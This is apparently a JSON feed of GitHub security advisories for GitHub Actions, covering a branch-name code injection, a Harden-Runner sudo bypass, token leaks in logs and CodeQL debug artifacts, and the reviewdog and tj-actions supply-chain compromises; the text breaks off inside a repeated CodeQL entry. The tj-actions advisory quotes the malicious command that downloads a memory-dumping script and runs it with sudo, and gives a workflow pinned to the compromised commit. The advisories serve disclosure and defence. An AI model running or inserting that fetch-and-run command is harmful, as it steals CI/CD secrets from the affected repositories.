{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Github Actions",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aactions",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/actions.json",
    "description": "Security Advisory for Github Actions on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Potentially untrusted data flows into PR creation logic. A malicious actor could construct a branch name that injects arbitrary code.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This is patched in 1.13.6</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Downgrade to &lt;1.13.2</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections\">Understanding the Risk of Script Injections</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OZI-Project/publish/security/advisories/GHSA-2487-9f55-2vg9\">https://github.com/OZI-Project/publish/security/advisories/GHSA-2487-9f55-2vg9</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47271\">https://nvd.nist.gov/vuln/detail/CVE-2025-47271</a></li>\n<li><a href=\"https://github.com/OZI-Project/publish/commit/abd8524ec69800890529846b3ccfb09ce7c10b5c\">https://github.com/OZI-Project/publish/commit/abd8524ec69800890529846b3ccfb09ce7c10b5c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2487-9f55-2vg9\">https://github.com/advisories/GHSA-2487-9f55-2vg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2487-9f55-2vg9",
            "title": "[OZI-Project/publish] OZI-Project/ozi-publish Code Injection vulnerability",
            "date_modified": "2025-05-12T19:58:08.000Z",
            "date_published": "2025-05-12T19:58:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2487-9f55-2vg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Harden-Runner includes a policy option <code>disable-sudo</code> to prevent the GitHub Actions runner user from using sudo. This is implemented by removing the runner user from the sudoers file. However, this control can be bypassed as the runner user, being part of the docker group, can interact with the Docker daemon to launch privileged containers or access the host filesystem. This allows the attacker to regain root access or restore the sudoers file, effectively bypassing the restriction. </p>\n<p>For an attacker to bypass this control, they would first need the ability to run their malicious code (e.g., by a supply chain attack similar to tj-actions or exploiting a Pwn Request vulnerability)) on the runner. This vulnerability has been fixed in Harden-Runner version <code>v2.12.0</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker with the ability to run their malicious code on a runner configured with <code>disable-sudo: true</code> can escalate privileges to root using Docker, defeating the intended security control.</p>\n<h3 id=\"affected-configuration\">Affected Configuration</h3>\n<p>•\tHarden-Runner configurations that use <code>disable-sudo: true</code> on GitHub-hosted runners or on ephemeral self-hosted VM-based runners.\n•\tThis issue does not apply to Kubernetes-based Actions Runner Controller (ARC) Harden-Runner.</p>\n<h3 id=\"mitigation--fix\">Mitigation / Fix</h3>\n<p>This vulnerability has been fixed in Harden-Runner version <code>v2.12.0</code>. Users should migrate to the stronger <code>disable-sudo-and-containers</code> policy. This setting:\n•\tDisables sudo access,\n•\tRemoves access to dockerd and containerd sockets,\n•\tUninstalls Docker from the runner entirely, preventing container-based privilege escalation paths.</p>\n<h3 id=\"additional-improvements\">Additional Improvements</h3>\n<p>•\tThe <code>disable-sudo</code> option will be deprecated in the future, as it does not sufficiently restrict privilege escalation on its own. \n•\tHarden-Runner now includes detections to alert on attempts to evade the <code>disable-sudo</code> policy.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Reported by @loresuso and @darryk10. We would like to thank them for collaborating with us to mitigate the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/step-security/harden-runner/security/advisories/GHSA-mxr3-8whj-j74r\">https://github.com/step-security/harden-runner/security/advisories/GHSA-mxr3-8whj-j74r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32955\">https://nvd.nist.gov/vuln/detail/CVE-2025-32955</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/commit/0634a2670c59f64b4a01f0f96f84700a4088b9f0\">https://github.com/step-security/harden-runner/commit/0634a2670c59f64b4a01f0f96f84700a4088b9f0</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/releases/tag/v2.12.0\">https://github.com/step-security/harden-runner/releases/tag/v2.12.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mxr3-8whj-j74r\">https://github.com/advisories/GHSA-mxr3-8whj-j74r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mxr3-8whj-j74r",
            "title": "[step-security/harden-runner] Harden-Runner allows evasion of 'disable-sudo' policy",
            "date_modified": "2025-04-22T01:07:04.000Z",
            "date_published": "2025-04-22T01:07:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mxr3-8whj-j74r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users using the <a href=\"https://github.com/canonical/get-workflow-version-action/blob/a5d53b08d254a157ea441c9819ea5002ffc12edc/action.yaml#L10\"><code>github-token</code> input</a> are impacted.</p>\n<p>If the <code>get-workflow-version-action</code> step fails, the exception output may include the GITHUB_TOKEN. If the full token is included in the exception output, GitHub will automatically redact the secret from the GitHub Actions logs. However, the token may be truncated—causing part of the GITHUB_TOKEN to be displayed in plaintext in the GitHub Actions logs.</p>\n<p>Anyone with read access to the GitHub repository can view GitHub Actions logs. For public repositories, anyone can view the GitHub Actions logs.</p>\n<p>The opportunity to exploit this vulnerability is limited—the GITHUB_TOKEN is automatically revoked when the job completes. However, there is an opportunity for an attack in the time between the GITHUB_TOKEN being displayed in the logs and the completion of the job. Normally this is less than a second, but it may be greater if <a href=\"https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idstepscontinue-on-error\"><code>continue-on-error</code></a> is used in the <code>get-workflow-version-action</code> step or if <a href=\"https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions#status-check-functions\">status check functions</a> are used in a later step in the same job. For an example of an attack in the time between the GITHUB_TOKEN being displayed in the logs &amp; the completion of the job, see <a href=\"https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/\">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/</a></p>\n<p>For users who passed the GITHUB_TOKEN to the <code>github-token</code> input, update to <code>v1.0.1</code>. Any secrets that were partially leaked while using <code>v1.0.0</code> should have already been revoked, since the GITHUB_TOKEN is automatically revoked when the job completes. However, in the unlikely event that an attack was executed using a GITHUB_TOKEN before it was revoked (as described above), users' repositories may still be impacted—for example, a sophisticated attack could have used the GITHUB_TOKEN to push something to the repository.</p>\n<p>The potential effects of an attack depend on the permissions of any GITHUB_TOKENs that were leaked. However, in a very sophisticated attack, even a GITHUB_TOKEN with read-only permissions can affect other GitHub Actions in the same repository if those actions use the Actions <a href=\"https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows\">cache</a>. For more information, see the \"But Wait, There’s More\" section of <a href=\"https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/\">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/</a> and <a href=\"https://github.com/AdnaneKhan/Cacheract\">https://github.com/AdnaneKhan/Cacheract</a></p>\n<p>If any users used a long-lived secret (e.g. a personal access token) instead of the GITHUB_TOKEN in the <code>github-token</code> input, they should immediately revoke that secret. The <code>get-workflow-version-action</code>'s documentation &amp; examples all instructed the user to use the GITHUB_TOKEN, so it is unlikely that users used a long-lived secret instead of the GITHUB_TOKEN.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been fixed in <code>v1.0.1</code>. Also, the <code>v1</code> tag has been updated to include the fix.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/canonical/get-workflow-version-action/issues/2\">https://github.com/canonical/get-workflow-version-action/issues/2</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/canonical/get-workflow-version-action/security/advisories/GHSA-26wh-cc3r-w6pj\">https://github.com/canonical/get-workflow-version-action/security/advisories/GHSA-26wh-cc3r-w6pj</a></li>\n<li><a href=\"https://github.com/canonical/get-workflow-version-action/issues/2\">https://github.com/canonical/get-workflow-version-action/issues/2</a></li>\n<li><a href=\"https://github.com/canonical/get-workflow-version-action/commit/88281a62e96e1c0ef4df30352ae0668a9f3e3369\">https://github.com/canonical/get-workflow-version-action/commit/88281a62e96e1c0ef4df30352ae0668a9f3e3369</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31479\">https://nvd.nist.gov/vuln/detail/CVE-2025-31479</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-26wh-cc3r-w6pj\">https://github.com/advisories/GHSA-26wh-cc3r-w6pj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-26wh-cc3r-w6pj",
            "title": "[canonical/get-workflow-version-action] canonical/get-workflow-version-action can leak a partial GITHUB_TOKEN in exception output",
            "date_modified": "2025-04-03T13:26:03.000Z",
            "date_published": "2025-04-02T22:36:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-26wh-cc3r-w6pj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>reviewdog/action-setup@v1</code> was compromised March 11, 2025, between 18:42 and 20:31 UTC, with malicious code added that dumps exposed secrets to Github Actions Workflow Logs.</p>\n<p>Other reviewdog actions that use <code>reviewdog/action-setup@v1</code> would also be compromised, regardless of version or pinning method:</p>\n<ul>\n<li>reviewdog/action-shellcheck</li>\n<li>reviewdog/action-composite-template</li>\n<li>reviewdog/action-staticcheck</li>\n<li>reviewdog/action-ast-grep</li>\n<li>reviewdog/action-typos</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p>Malicious commit: <a href=\"https://github.com/reviewdog/action-setup/commit/f0d342d\">https://github.com/reviewdog/action-setup/commit/f0d342d</a>\nfix/retag via version upgrade: <a href=\"https://github.com/reviewdog/action-setup/commit/3f401fe\">https://github.com/reviewdog/action-setup/commit/3f401fe</a></p>\n<p>See the detailed report from Wiz Research: <a href=\"https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup\">Wiz Blog Post</a> and reviewdog maintainer annoucement: <a href=\"https://github.com/reviewdog/reviewdog/issues/2079\">reviewdog #2079</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reviewdog/reviewdog/security/advisories/GHSA-qmg3-hpqr-gqvc\">https://github.com/reviewdog/reviewdog/security/advisories/GHSA-qmg3-hpqr-gqvc</a></li>\n<li><a href=\"https://github.com/reviewdog/reviewdog/issues/2079\">https://github.com/reviewdog/reviewdog/issues/2079</a></li>\n<li><a href=\"https://github.com/reviewdog/action-setup/commit/3f401fe1d58fe77e10d665ab713057375e39b887\">https://github.com/reviewdog/action-setup/commit/3f401fe1d58fe77e10d665ab713057375e39b887</a></li>\n<li><a href=\"https://github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec\">https://github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec</a></li>\n<li><a href=\"https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup\">https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30154\">https://nvd.nist.gov/vuln/detail/CVE-2025-30154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qmg3-hpqr-gqvc\">https://github.com/advisories/GHSA-qmg3-hpqr-gqvc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qmg3-hpqr-gqvc",
            "title": "[reviewdog/action-setup] Multiple Reviewdog actions were compromised during a specific time period",
            "date_modified": "2025-05-13T07:44:29.000Z",
            "date_published": "2025-03-19T15:19:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qmg3-hpqr-gqvc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A supply chain attack compromised the <strong>tj-actions/changed-files</strong> GitHub Action, impacting over 23,000 repositories. Attackers retroactively modified multiple version tags to reference a malicious commit, exposing CI/CD secrets in workflow logs. The vulnerability existed between <strong>March 14 and March 15, 2025</strong>, and has since been mitigated. This poses a significant risk of unauthorized access to sensitive information.</p>\n<p>This has been patched in <a href=\"https://github.com/tj-actions/changed-files/releases/tag/v46.0.1\">v46.0.1</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>The attack involved modifying the <strong>tj-actions/changed-files</strong> GitHub Action to execute a malicious Python script. This script extracted secrets from the Runner Worker process memory and printed them in GitHub Actions logs, making them publicly accessible in repositories with public workflow logs.  </p>\n<h4 id=\"key-indicators-of-compromise-ioc\">Key Indicators of Compromise (IoC):</h4>\n<ul>\n<li><strong>Malicious commit</strong>: <a href=\"https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67\">0e58ed8671d6b60d0890c21b07f8835ace038e67</a>  </li>\n<li><strong>Retroactively updated tags pointing to the malicious commit</strong>:  <ul>\n<li><code>v1.0.0</code>: 0e58ed8671d6b60d0890c21b07f8835ace038e67  </li>\n<li><code>v35.7.7-sec</code>: 0e58ed8671d6b60d0890c21b07f8835ace038e67  </li>\n<li><code>v44.5.1</code>: 0e58ed8671d6b60d0890c21b07f8835ace038e67</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"malicious-code-execution\">Malicious Code Execution:</h4>\n<p>The malicious script downloaded and executed a Python script that scanned memory for secrets, base64-encoded them, and logged them in the build logs:  </p>\n<pre><code>B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3`\n</code></pre>\n<p>This script targeted the <strong>Runner Worker process</strong>, extracting and exfiltrating its memory contents.  </p>\n<h3 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h3>\n<h4 id=\"steps-to-reproduce\">Steps to Reproduce:</h4>\n<ol>\n<li>Create a GitHub Actions workflow using the <strong>tj-actions/changed-files</strong> action:</li>\n</ol>\n<pre><code class=\"language-yml\">name: \"tj-action changed-files incident\"\non:\n  pull_request:\n    branches:\n      - main\njobs:\n  changed_files:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Get changed files\n        id: changed-files\n        uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67\n</code></pre>\n<ol start=\"2\">\n<li>Run the workflow and inspect the logs in the Actions tab.  </li>\n<li>Vulnerable workflows may display secrets in the logs.</li>\n</ol>\n<h4 id=\"detection\">Detection:</h4>\n<p>Analyze network traffic using <a href=\"https://github.com/step-security/harden-runner\">Harden-Runner</a>, which detects unauthorized outbound requests to:  </p>\n<ul>\n<li><code>gist.githubusercontent.com</code></li>\n</ul>\n<p>Live reproduction logs:<br>🔗 <a href=\"https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357\">Harden-Runner Insights</a>  </p>\n<p>This attack was detected by <strong>StepSecurity</strong> when anomaly detection flagged an unauthorized outbound network call to <code>gist.githubusercontent.com</code>.  </p>\n<h3 id=\"duration-of-vulnerability\">Duration of Vulnerability</h3>\n<p>The vulnerability was active between <strong>March 14 and March 15, 2025</strong>.  </p>\n<h3 id=\"action-required\">Action Required</h3>\n<ol>\n<li><p><strong>Review your workflows executed between March 14 and March 15</strong>:  </p>\n<ul>\n<li>Check the <strong>changed-files</strong> section for unexpected output.  </li>\n<li>Decode suspicious output using the following command:  <pre><code>echo 'xxx' | base64 -d | base64 -d\n</code></pre>\n</li>\n<li>If the output contains sensitive information (e.g., tokens or secrets), revoke and rotate those secrets immediately.</li>\n</ul>\n</li>\n<li><p><strong>Update workflows referencing the compromised commit</strong>:  </p>\n<ul>\n<li>If your workflows reference the malicious commit directly by its SHA, update them immediately to avoid using the compromised version.</li>\n</ul>\n</li>\n<li><p><strong>Tagged versions</strong>:  </p>\n<ul>\n<li>If you are using tagged versions (e.g., <code>v35</code>, <code>v44.5.1</code>), no action is required as these tags have been updated and are now safe to use.</li>\n</ul>\n</li>\n<li><p><strong>Rotate potentially exposed secrets</strong>:  </p>\n<ul>\n<li>As a precaution, rotate any secrets that may have been exposed during this timeframe to ensure the continued security of your workflows.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li><strong>Type of vulnerability</strong>: Supply chain attack, Secrets exposure, Information leakage  </li>\n<li><strong>Who is impacted</strong>:  <ul>\n<li>Over 23,000 repositories using <strong>tj-actions/changed-files</strong>.  </li>\n<li>Organizations with public repositories are at the highest risk, as their logs may already be compromised.</li>\n</ul>\n</li>\n<li><strong>Potential consequences</strong>:  <ul>\n<li>Theft of CI/CD secrets (API keys, cloud credentials, SSH keys).  </li>\n<li>Unauthorized access to source code, infrastructure, and production environments.  </li>\n<li>Credential leaks in public repositories, enabling further supply chain attacks.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30066\">https://nvd.nist.gov/vuln/detail/CVE-2025-30066</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/issues/2463\">https://github.com/tj-actions/changed-files/issues/2463</a></li>\n<li><a href=\"https://github.com/github/docs/blob/962a1c8dccb8c0f66548b324e5b921b5e4fbc3d6/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md?plain=1#L191-L193\">https://github.com/github/docs/blob/962a1c8dccb8c0f66548b324e5b921b5e4fbc3d6/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md?plain=1#L191-L193</a></li>\n<li><a href=\"https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised\">https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised</a></li>\n<li><a href=\"https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised\">https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised</a></li>\n<li><a href=\"https://github.com/chains-project/maven-lockfile/pull/1111\">https://github.com/chains-project/maven-lockfile/pull/1111</a></li>\n<li><a href=\"https://github.com/rackerlabs/genestack/pull/903\">https://github.com/rackerlabs/genestack/pull/903</a></li>\n<li><a href=\"https://news.ycombinator.com/item?id=43367987\">https://news.ycombinator.com/item?id=43367987</a></li>\n<li><a href=\"https://web.archive.org/web/20250315060250/https://github.com/tj-actions/changed-files/issues/2463\">https://web.archive.org/web/20250315060250/https://github.com/tj-actions/changed-files/issues/2463</a></li>\n<li><a href=\"https://github.com/espressif/arduino-esp32/issues/11127\">https://github.com/espressif/arduino-esp32/issues/11127</a></li>\n<li><a href=\"https://github.com/modal-labs/modal-examples/issues/1100\">https://github.com/modal-labs/modal-examples/issues/1100</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/issues/2464\">https://github.com/tj-actions/changed-files/issues/2464</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/blob/45fb12d7a8bedb4da42342e52fe054c6c2c3fd73/README.md?plain=1#L20-L28\">https://github.com/tj-actions/changed-files/blob/45fb12d7a8bedb4da42342e52fe054c6c2c3fd73/README.md?plain=1#L20-L28</a></li>\n<li><a href=\"https://sysdig.com/blog/detecting-and-mitigating-the-tj-actions-changed-files-supply-chain-attack-cve-2025-30066\">https://sysdig.com/blog/detecting-and-mitigating-the-tj-actions-changed-files-supply-chain-attack-cve-2025-30066</a></li>\n<li><a href=\"https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066\">https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066</a></li>\n<li><a href=\"https://www.sweet.security/blog/cve-2025-30066-tj-actions-supply-chain-attack\">https://www.sweet.security/blog/cve-2025-30066-tj-actions-supply-chain-attack</a></li>\n<li><a href=\"https://www.stream.security/post/github-action-supply-chain-attack-exposes-secrets-what-you-need-to-know-and-how-to-respond\">https://www.stream.security/post/github-action-supply-chain-attack-exposes-secrets-what-you-need-to-know-and-how-to-respond</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/issues/2477\">https://github.com/tj-actions/changed-files/issues/2477</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/releases/tag/v46.0.1\">https://github.com/tj-actions/changed-files/releases/tag/v46.0.1</a></li>\n<li><a href=\"https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066\">https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066</a></li>\n<li><a href=\"https://blog.gitguardian.com/compromised-tj-actions\">https://blog.gitguardian.com/compromised-tj-actions</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5\">https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mrrh-fwg8-r2c3\">https://github.com/advisories/GHSA-mrrh-fwg8-r2c3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mrrh-fwg8-r2c3",
            "title": "[tj-actions/changed-files] tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets by reading actions logs.",
            "date_modified": "2025-03-24T14:23:39.000Z",
            "date_published": "2025-03-15T06:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mrrh-fwg8-r2c3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact-summary\">Impact summary</h3>\n<p>In some circumstances, debug artifacts uploaded by the CodeQL Action after a failed code scanning workflow run may contain the environment variables from the workflow run, including any secrets that were exposed as environment variables to the workflow. Users with read access to the repository would be able to access this artifact, containing any secrets from the environment.</p>\n<p>For some affected workflow runs, the exposed environment variables in the debug artifacts included a valid <code>GITHUB_TOKEN</code> for the workflow run, which has access to the repository in which the workflow ran, and all the permissions specified in the workflow or job. The <code>GITHUB_TOKEN</code> is valid until the job completes or 24 hours has elapsed, whichever comes first.</p>\n<p>Environment variables are exposed only from workflow runs that satisfy all of the following conditions:</p>\n<ul>\n<li>Code scanning workflow configured to scan the Java/Kotlin languages.</li>\n<li>Running in a repository containing Kotlin source code.</li>\n<li>Running with <a href=\"https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough\">debug artifacts enabled</a>.</li>\n<li>Using CodeQL Action versions &lt;= 3.28.2, and CodeQL CLI versions &gt;= 2.9.2 (May 2022) and &lt;= 2.20.2.</li>\n<li>The workflow run fails before the CodeQL database is finalized within the <code>github/codeql-action/analyze</code> step.</li>\n<li>Running in any GitHub environment: GitHub.com, GitHub Enterprise Cloud, and GitHub Enterprise Server. (Note: artifacts are only accessible to users within the same GitHub environment with access to the scanned repo.)</li>\n</ul>\n<p>The <code>GITHUB_TOKEN</code> exposed in this way would only have been valid for workflow runs that satisfy all of the following conditions, in addition to the conditions above:</p>\n<ul>\n<li>Using CodeQL Action versions &gt;= 3.26.11 (October 2024) and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3.</li>\n<li>Running in GitHub.com or GitHub Enterprise Cloud only (not valid on GitHub Enterprise Server).</li>\n</ul>\n<p>In rare cases during advanced setup, logging of environment variables may also occur during database creation of Java, Swift, and C/C++. Please read the corresponding CodeQL CLI advisory <a href=\"https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m\">GHSA-gqh3-9prg-j95m</a> for more details.</p>\n<h3 id=\"impact-details\">Impact details</h3>\n<p>In CodeQL CLI versions &gt;= 2.9.2 and &lt;= 2.20.2, the CodeQL Kotlin extractor logs all environment variables by default into an intermediate file during the process of creating a CodeQL database for Kotlin code. \nThis is a part of the CodeQL CLI and is invoked by the CodeQL Action for analyzing Kotlin repositories. \nOn Actions, the environment variables logged include GITHUB_TOKEN, which grants permissions to the repository being scanned.</p>\n<p>The intermediate file containing environment variables is deleted when finalizing the database, so it is not included in a successfully created database. It is, however, included in the debug artifact that is uploaded on a failed analysis run if the CodeQL Action was invoked in debug mode.</p>\n<p>Therefore, under these specific circumstances (incomplete database creation using the CodeQL Action in debug mode) an attacker with access to the debug artifact would gain unauthorized access to repository secrets from the environment, including both the <code>GITHUB_TOKEN</code> and any user-configured secrets made available via environment variables.</p>\n<p>The impact of the <code>GITHUB_TOKEN</code> leaked in this environment is limited:</p>\n<ul>\n<li>For workflows on GitHub.com and GitHub Enterprise Cloud using CodeQL Action versions &gt;= 3.26.11 and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3, which in turn use the <code>actions/artifacts v4</code> library, the debug artifact is uploaded before the workflow job completes. During this time the <code>GITHUB_TOKEN</code> is still valid, providing an opportunity for attackers to gain access to the repository.</li>\n<li>For all other workflows, the debug artifact is uploaded after the workflow job completes, at which point the leaked <code>GITHUB_TOKEN</code> has been revoked and cannot be used to access the repository.</li>\n</ul>\n<h3 id=\"mitigations\">Mitigations</h3>\n<p>Update to CodeQL Action version 3.28.3 or later, or CodeQL CLI version 2.20.3 or later.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in CodeQL Action version 3.28.3, which no longer uploads database artifacts in debug mode.\nThis vulnerability will be fixed in CodeQL CLI version 2.20.3, in which database creation for all languages no longer logs the complete environment by default.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/github/codeql-action/pull/1074\">Pull request that bundled CodeQL CLI 2.9.2 with Kotlin extractor environment variable logging </a></li>\n<li><a href=\"https://github.com/github/codeql-action/pull/2482\">Pull request that introduced the <code>actions/artifacts v4</code> library, allowing for <code>GITHUB_TOKEN</code> exposure in the CodeQL Action debug artifacts before the token was revoked</a></li>\n<li><a href=\"https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m\">Related security advisory for the CodeQL CLI</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm\">https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm</a></li>\n<li><a href=\"https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m\">https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24362\">https://nvd.nist.gov/vuln/detail/CVE-2025-24362</a></li>\n<li><a href=\"https://github.com/github/codeql-action/pull/1074\">https://github.com/github/codeql-action/pull/1074</a></li>\n<li><a href=\"https://github.com/github/codeql-action/pull/2482\">https://github.com/github/codeql-action/pull/2482</a></li>\n<li><a href=\"https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa\">https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa</a></li>\n<li><a href=\"https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough\">https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough</a></li>\n<li><a href=\"https://news.ycombinator.com/item?id=43527044\">https://news.ycombinator.com/item?id=43527044</a></li>\n<li><a href=\"https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql\">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqf5-2xx6-9wfm\">https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqf5-2xx6-9wfm",
            "title": "[github/codeql-action] GitHub PAT written to debug artifacts",
            "date_modified": "2025-03-31T21:55:43.000Z",
            "date_published": "2025-01-24T18:44:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqf5-2xx6-9wfm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact-summary\">Impact summary</h3>\n<p>In some circumstances, debug artifacts uploaded by the CodeQL Action after a failed code scanning workflow run may contain the environment variables from the workflow run, including any secrets that were exposed as environment variables to the workflow. Users with read access to the repository would be able to access this artifact, containing any secrets from the environment.</p>\n<p>For some affected workflow runs, the exposed environment variables in the debug artifacts included a valid <code>GITHUB_TOKEN</code> for the workflow run, which has access to the repository in which the workflow ran, and all the permissions specified in the workflow or job. The <code>GITHUB_TOKEN</code> is valid until the job completes or 24 hours has elapsed, whichever comes first.</p>\n<p>Environment variables are exposed only from workflow runs that satisfy all of the following conditions:</p>\n<ul>\n<li>Code scanning workflow configured to scan the Java/Kotlin languages.</li>\n<li>Running in a repository containing Kotlin source code.</li>\n<li>Running with <a href=\"https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough\">debug artifacts enabled</a>.</li>\n<li>Using CodeQL Action versions &lt;= 3.28.2, and CodeQL CLI versions &gt;= 2.9.2 (May 2022) and &lt;= 